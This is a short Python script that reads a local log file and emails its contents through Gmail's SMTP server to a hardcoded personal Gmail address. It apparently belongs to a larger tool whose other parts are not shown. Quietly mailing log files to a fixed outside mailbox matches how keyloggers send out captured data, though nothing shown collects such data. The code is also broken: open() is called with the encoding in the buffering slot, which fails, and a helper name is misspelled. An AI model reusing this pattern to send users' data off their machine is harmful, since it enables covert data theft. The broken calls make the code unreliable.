import smtplib
import filemanager

def main():
    sender = "skyjoozero@gmail.com"
    receiver = "skyjoozero@gmail.com"
    username = "skyjoozero"
    password = ""

    log = open(filemanager.getLogFilePath(filemanager.getLogFimeName()), 'r', 'utf-8').read().encode()

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username, password)
    server.sendmail(sender, receiver, log)
    server.quit()